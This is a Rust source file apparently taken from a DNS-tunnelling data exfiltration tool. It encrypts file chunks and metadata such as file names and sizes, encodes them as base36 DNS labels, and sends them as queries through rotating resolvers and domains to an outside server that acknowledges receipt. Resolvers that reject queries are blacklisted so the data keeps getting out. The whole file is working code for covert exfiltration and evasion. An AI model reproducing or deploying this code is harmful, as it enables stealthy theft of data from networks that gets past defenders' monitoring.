use crate::base36;
use crate::config::Config;
use crate::crypto::{derive_key, encrypt};
use crate::limits::{
    DNS_MAX_NAME, ENVELOPE_LEN, LABEL_CAP, META_LABEL_PREFIX, PAD_LABEL, SESSION_TAG_LEN,
};
use crate::metadata::ExfilSession;
use crate::resolver::ResolverPool;
use anyhow::{anyhow, Context, Result};
use rand::Rng;
use std::collections::{HashMap, HashSet};
use std::convert::TryInto;
use std::net::{Ipv4Addr, SocketAddr, UdpSocket};
use std::time::{Duration, Instant};
use trust_dns_proto::op::{Message, MessageType, OpCode, Query};
use trust_dns_proto::rr::{Name, RData, RecordType};
use trust_dns_proto::serialize::binary::{BinEncodable, BinEncoder};

const SESSION_TAG_PREFIX: char = 'E';
const HEADER_CHUNK_INDEX: u32 = u32::MAX;
const ENVELOPE_VERSION: u8 = 1;
const ENVELOPE_FLAG_INIT: u8 = 0x01;
const ENVELOPE_FLAG_CHUNK: u8 = 0x02;
const ENVELOPE_FLAG_COMPLETE: u8 = 0x04;
const ENVELOPE_FLAG_METADATA: u8 = 0x08;
const ENVELOPE_FLAG_FINAL: u8 = 0x10;
const FLAG_HEADER: u8 = 0x01;
const RESOLVER_REJECT_THRESHOLD: u32 = 3;
const RESOLVER_BLACKLIST_SECS: u64 = 120;

pub struct DnsTransmitter {
    cfg: Config,
    pool: ResolverPool,
    aes_key: [u8; 32],
    last_domain: Option<String>,
    ack_next: HashSet<Ipv4Addr>,
    resolver_blacklist: HashMap<SocketAddr, Instant>,
    resolver_rejects: HashMap<SocketAddr, u32>,
}

impl DnsTransmitter {
    pub fn new(cfg: Config, pool: ResolverPool) -> Self {
        let aes_key = derive_key(&cfg.encryption_key);
        let mut ack_next = HashSet::new();

        for ip_str in cfg.server_ips() {
            if let Ok(ip) = ip_str.parse::<Ipv4Addr>() {
                ack_next.insert(increment_ip(ip));
            }
        }

        if ack_next.is_empty() {
            ack_next.insert(increment_ip(Ipv4Addr::new(127, 0, 0, 1)));
        }

        Self {
            cfg,
            pool,
            aes_key,
            last_domain: None,
            ack_next,
            resolver_blacklist: HashMap::new(),
            resolver_rejects: HashMap::new(),
        }
    }

    pub fn send_header(&mut self, session: &ExfilSession) -> Result<()> {
        let total_frames: u32 = session
            .total_frames()
            .try_into()
            .map_err(|_| anyhow!("transfer requires too many frames for counter width"))?;
        self.send_frame(session, FrameDescriptor::init(total_frames), None)
    }

    pub fn send_metadata_segments(
        &mut self,
        session: &ExfilSession,
        segments: &[Vec<u8>],
    ) -> Result<()> {
        if segments.is_empty() {
            return Err(anyhow!("metadata segments cannot be empty"));
        }

        let total = segments.len() as u32;
        for (idx, segment) in segments.iter().enumerate() {
            if segment.is_empty() {
                return Err(anyhow!("metadata segment must not be empty"));
            }
            let descriptor = FrameDescriptor::metadata(idx as u32, total);
            self.send_frame(session, descriptor, Some(segment.as_slice()))?;
        }
        Ok(())
    }

    pub fn send_chunk(&mut self, session: &ExfilSession, index: usize, chunk: &[u8]) -> Result<()> {
        let frame_index = index
            .checked_add(1)
            .ok_or_else(|| anyhow!("chunk index overflow"))? as u32;
        self.send_frame(session, FrameDescriptor::data(frame_index), Some(chunk))
    }

    pub fn send_completion(&mut self, session: &ExfilSession) -> Result<()> {
        self.send_frame(session, FrameDescriptor::complete(), None)
    }

    fn send_frame(
        &mut self,
        session: &ExfilSession,
        descriptor: FrameDescriptor,
        payload: Option<&[u8]>,
    ) -> Result<()> {
        if descriptor.requires_payload() != payload.is_some() {
            return Err(anyhow!("chunk frames must include payload data"));
        }

        let labels = self.build_labels(session, &descriptor, payload)?;
        let qname = self.build_name(&labels)?;

        let mut last_err = None;
        for attempt in 0..3 {
            let resolver = self.next_resolver();
            match self.dispatch(&qname, resolver) {
                Ok(true) => {
                    self.clear_resolver_penalty(resolver);
                    return Ok(());
                }
                Ok(false) => {
                    self.note_resolver_reject(resolver);
                    last_err = Some(anyhow!(
                        "resolver {} rejected chunk (attempt {})",
                        resolver,
                        attempt + 1
                    ));
                }
                Err(e) => last_err = Some(e),
            }
        }

        Err(last_err.unwrap_or_else(|| anyhow!("failed to send frame")))
    }

    fn dispatch(&self, name: &Name, resolver: SocketAddr) -> Result<bool> {
        let mut msg = Message::new();
        msg.set_id(rand::thread_rng().gen());
        msg.set_message_type(MessageType::Query);
        msg.set_op_code(OpCode::Query);
        msg.set_recursion_desired(true);
        msg.add_query(Query::query(name.clone(), RecordType::A));

        let mut buf = Vec::with_capacity(512);
        let mut encoder = BinEncoder::new(&mut buf);
        msg.emit(&mut encoder)?;

        let socket = UdpSocket::bind((Ipv4Addr::UNSPECIFIED, 0))?;
        socket.set_read_timeout(Some(Duration::from_secs(2)))?;
        socket.send_to(&buf, resolver)?;

        let mut resp_buf = [0u8; 512];
        let (size, _) = socket.recv_from(&mut resp_buf)?;
        let resp = Message::from_vec(&resp_buf[..size])?;

        let ack = resp
            .answers()
            .iter()
            .find_map(|record| match record.data() {
                Some(RData::A(ip)) => Some(ip.0),
                _ => None,
            });

        Ok(matches!(ack, Some(ip) if self.ack_next.contains(&ip)))
    }

    fn build_name(&mut self, labels: &[String]) -> Result<Name> {
        if labels.is_empty() {
            return Err(anyhow!("frame has no labels"));
        }

        let domain = self.select_domain();
        let mut fqdn = labels.join(".");
        fqdn.push('.');
        fqdn.push_str(&domain);
        if fqdn.len() > DNS_MAX_NAME {
            return Err(anyhow!(
                "query name length {} exceeds DNS max {}",
                fqdn.len(),
                DNS_MAX_NAME
            ));
        }
        Name::from_ascii(&fqdn).context("invalid query name")
    }

    fn build_labels(
        &self,
        session: &ExfilSession,
        descriptor: &FrameDescriptor,
        payload: Option<&[u8]>,
    ) -> Result<Vec<String>> {
        let mut labels = Vec::with_capacity(3);
        labels.push(self.build_metadata_label(session, descriptor)?);

        match payload {
            Some(bytes) => {
                if bytes.is_empty() {
                    return Err(anyhow!("chunk payload must not be empty"));
                }
                let mut payload_labels = self.build_payload_labels(bytes)?;
                labels.append(&mut payload_labels);
            }
            None => labels.push(PAD_LABEL.to_string()),
        }

        Ok(labels)
    }

    fn build_metadata_label(
        &self,
        session: &ExfilSession,
        descriptor: &FrameDescriptor,
    ) -> Result<String> {
        let mut buf = Vec::with_capacity(ENVELOPE_LEN);
        buf.push(ENVELOPE_VERSION);
        buf.push(self.envelope_flags(session, descriptor));
        let tag = encode_session_tag(session.session_id);
        if tag.as_bytes().len() != SESSION_TAG_LEN {
            return Err(anyhow!("invalid session tag length"));
        }
        buf.extend_from_slice(tag.as_bytes());
        let counter = descriptor.counter_value();
        buf.extend_from_slice(&counter.to_le_bytes());

        let ciphertext = encrypt(&buf, &self.aes_key).map_err(|e| anyhow!("{e}"))?;
        let encoded = base36::encode(&ciphertext);
        let total_len = META_LABEL_PREFIX.len() + encoded.len();
        if total_len > LABEL_CAP {
            return Err(anyhow!(
                "metadata label ({total_len} chars) exceeds label budget {LABEL_CAP}"
            ));
        }
        Ok(format!("{}{}", META_LABEL_PREFIX, encoded))
    }

    fn envelope_flags(&self, session: &ExfilSession, descriptor: &FrameDescriptor) -> u8 {
        match descriptor.phase {
            FramePhase::Init { .. } => ENVELOPE_FLAG_INIT,
            FramePhase::Chunk { counter, role } => {
                let mut flags = ENVELOPE_FLAG_CHUNK;
                match role {
                    ChunkRole::Metadata {
                        segment_index,
                        segment_total,
                    } => {
                        let total = if segment_total == 0 { 1 } else { segment_total };
                        flags |= ENVELOPE_FLAG_METADATA;
                        if segment_index + 1 == total {
                            flags |= ENVELOPE_FLAG_FINAL;
                        }
                    }
                    ChunkRole::Data => {
                        if counter as usize == session.job.total_chunks {
                            flags |= ENVELOPE_FLAG_FINAL;
                        }
                    }
                }
                flags
            }
            FramePhase::Complete => ENVELOPE_FLAG_COMPLETE,
        }
    }

    fn build_payload_labels(&self, bytes: &[u8]) -> Result<Vec<String>> {
        let ciphertext = encrypt(bytes, &self.aes_key).map_err(|e| anyhow!("{e}"))?;
        let encoded = base36::encode(&ciphertext);
        Ok(split_encoded_labels(&encoded))
    }

    fn select_domain(&mut self) -> String {
        let domains = self.cfg.dns_domains();
        if domains.is_empty() {
            return "example.com".to_string();
        }

        if domains.len() == 1 {
            self.last_domain = Some(domains[0].to_string());
            return domains[0].to_string();
        }

        let mut rng = rand::thread_rng();
        let mut candidates: Vec<&str> = domains.iter().map(|s| s.as_str()).collect();
        if let Some(last) = &self.last_domain {
            candidates.retain(|d| *d != last.as_str());
            if candidates.is_empty() {
                candidates = domains.iter().map(|s| s.as_str()).collect();
            }
        }

        let choice = candidates[rng.gen_range(0..candidates.len())].to_string();
        self.last_domain = Some(choice.clone());
        choice
    }

    fn next_resolver(&mut self) -> SocketAddr {
        let total = self.pool.len().max(1);
        for _ in 0..total {
            let candidate = self.pool.next();
            if self.resolver_available(&candidate) {
                return candidate;
            }
        }
        let candidate = self.pool.next();
        self.resolver_blacklist.remove(&candidate);
        candidate
    }

    fn resolver_available(&mut self, resolver: &SocketAddr) -> bool {
        if let Some(expiry) = self.resolver_blacklist.get(resolver) {
            if Instant::now() < *expiry {
                return false;
            }
            self.resolver_blacklist.remove(resolver);
        }
        true
    }

    fn note_resolver_reject(&mut self, resolver: SocketAddr) {
        let entry = self.resolver_rejects.entry(resolver).or_insert(0);
        *entry += 1;
        if *entry >= RESOLVER_REJECT_THRESHOLD {
            self.resolver_blacklist
                .insert(resolver, Instant::now() + blacklist_expiry());
            *entry = 0;
        }
    }

    fn clear_resolver_penalty(&mut self, resolver: SocketAddr) {
        self.resolver_rejects.remove(&resolver);
        self.resolver_blacklist.remove(&resolver);
    }
}

#[derive(Clone)]
struct FrameDescriptor {
    phase: FramePhase,
}

impl FrameDescriptor {
    fn init(total_frames: u32) -> Self {
        Self {
            phase: FramePhase::Init { total_frames },
        }
    }

    fn metadata(segment_index: u32, segment_total: u32) -> Self {
        Self {
            phase: FramePhase::Chunk {
                counter: segment_index,
                role: ChunkRole::Metadata {
                    segment_index,
                    segment_total,
                },
            },
        }
    }

    fn data(counter: u32) -> Self {
        Self {
            phase: FramePhase::Chunk {
                counter,
                role: ChunkRole::Data,
            },
        }
    }

    fn complete() -> Self {
        Self {
            phase: FramePhase::Complete,
        }
    }

    fn requires_payload(&self) -> bool {
        matches!(self.phase, FramePhase::Chunk { .. })
    }

    fn counter_value(&self) -> u32 {
        match self.phase {
            FramePhase::Init { total_frames } => total_frames,
            FramePhase::Chunk { counter, .. } => counter,
            FramePhase::Complete => 0,
        }
    }
}

#[derive(Clone, Copy)]
enum FramePhase {
    Init { total_frames: u32 },
    Chunk { counter: u32, role: ChunkRole },
    Complete,
}

#[derive(Clone, Copy)]
enum ChunkRole {
    Metadata {
        segment_index: u32,
        segment_total: u32,
    },
    Data,
}

pub(crate) fn build_metadata_payload(session: &ExfilSession) -> Vec<u8> {
    let mut buf = Vec::with_capacity(160);
    buf.push(1); // version
    buf.push(FLAG_HEADER);
    buf.extend_from_slice(&session.session_id.to_le_bytes());
    buf.extend_from_slice(&session.job.job_id.to_le_bytes());
    buf.extend_from_slice(&HEADER_CHUNK_INDEX.to_le_bytes());
    buf.extend_from_slice(&(session.job.total_chunks as u32).to_le_bytes());
    buf.extend_from_slice(&0u16.to_le_bytes());
    buf.extend_from_slice(&(session.job.total_size as u64).to_le_bytes());

    let name_bytes = session.job.file_name.as_bytes();
    let name_len = name_bytes.len().min(63);
    buf.push(name_len as u8);
    buf.extend_from_slice(&name_bytes[..name_len]);

    let note_bytes = session.job.note.as_bytes();
    let note_len = note_bytes.len().min(63);
    buf.push(note_len as u8);
    buf.extend_from_slice(&note_bytes[..note_len]);
    buf
}

fn encode_session_tag(session_id: u32) -> String {
    let digits = SESSION_TAG_LEN.saturating_sub(1);
    if digits == 0 {
        return SESSION_TAG_PREFIX.to_string();
    }
    let max = max_value_for_width(digits);
    let modulus = max.saturating_add(1);
    let normalized = if modulus == 0 {
        session_id
    } else {
        session_id % modulus
    };
    let suffix = encode_base36_fixed(normalized, digits).expect("fixed width encoding");
    format!("{}{}", SESSION_TAG_PREFIX, suffix)
}

fn encode_base36_fixed(value: u32, width: usize) -> Result<String> {
    if width == 0 {
        return Err(anyhow!("width must be greater than zero"));
    }

    let alphabet = b"0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ";
    let mut buf = vec![b'0'; width];
    let mut remaining = value;
    for idx in (0..width).rev() {
        buf[idx] = alphabet[(remaining % 36) as usize];
        remaining /= 36;
    }

    if remaining != 0 {
        return Err(anyhow!("value {} does not fit width {}", value, width));
    }

    Ok(String::from_utf8(buf).expect("ascii"))
}

fn split_encoded_labels(encoded: &str) -> Vec<String> {
    if encoded.is_empty() {
        return vec![PAD_LABEL.to_string()];
    }

    encoded
        .as_bytes()
        .chunks(LABEL_CAP)
        .map(|chunk| {
            std::str::from_utf8(chunk)
                .expect("base36 chunk must be ascii")
                .to_string()
        })
        .collect()
}

fn blacklist_expiry() -> Duration {
    Duration::from_secs(RESOLVER_BLACKLIST_SECS)
}

fn max_value_for_width(width: usize) -> u32 {
    36u32.saturating_pow(width as u32).saturating_sub(1)
}

fn increment_ip(ip: Ipv4Addr) -> Ipv4Addr {
    let mut octets = ip.octets();
    for idx in (0..4).rev() {
        if octets[idx] == 255 {
            octets[idx] = 0;
        } else {
            octets[idx] += 1;
            break;
        }
    }
    Ipv4Addr::from(octets)
}
